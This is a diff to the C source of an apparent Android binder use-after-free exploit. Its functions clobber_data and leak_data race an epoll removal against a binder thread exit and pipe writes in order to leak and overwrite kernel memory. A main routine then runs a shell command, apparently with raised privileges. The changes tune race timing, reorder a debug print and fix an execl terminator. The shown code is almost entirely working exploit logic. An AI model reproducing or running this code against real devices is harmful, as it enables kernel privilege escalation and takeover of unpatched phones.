@@ -32,6 +32,8 @@
 #include <sys/un.h>
 #include <errno.h>
 
+#define DELAY_USEC 500000
+
 #define MIN(x,y) ((x)<(y) ? (x) : (y))
 #define MAX(x,y) ((x)>(y) ? (x) : (y))
 
@@ -153,7 +155,7 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
   if (fork_ret == 0){
     /* Child process */
     prctl(PR_SET_PDEATHSIG, SIGKILL);
-    sleep(2);
+    usleep(DELAY_USEC);
     printf("CHILD: Doing EPOLL_CTL_DEL.\n");
     epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
     printf("CHILD: Finished EPOLL_CTL_DEL.\n");
@@ -253,12 +255,10 @@ void leak_data(void* leakBuffer, int leakAmount,
   if (fork_ret == 0){
     /* Child process */
     prctl(PR_SET_PDEATHSIG, SIGKILL);
-    sleep(1);
+    usleep(DELAY_USEC);
     printf("CHILD: Doing EPOLL_CTL_DEL.\n");
     epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
     printf("CHILD: Finished EPOLL_CTL_DEL.\n");
-
-    // first page: dummy data
 
     unsigned long size1 = paddingSize+UAF_SPINLOCK+minimumLeak;
     printf("CHILD: initial %lx\n", size1);
@@ -311,8 +311,8 @@ void leak_data(void* leakBuffer, int leakAmount,
     printf("CHILD: Finished write to FIFO.\n");
     exit(0);
   }
-  printf("PARENT: Calling WRITEV\n");
   ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+  printf("PARENT: Calling WRITEV\n");
   b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
   printf("PARENT: writev() returns 0x%x\n", (unsigned int)b);
   if (b != totalLength) 
@@ -628,7 +628,7 @@ int main(int argc, char** argv) {
         int pid = fork();
 
         if ( pid == 0 ) {
-            execl( "/system/bin/sh", "/system/bin/sh", "-c", argv[1], 0 );
+            execl( "/system/bin/sh", "/system/bin/sh", "-c", argv[1], (char*)0 );
         }        
   }
   else
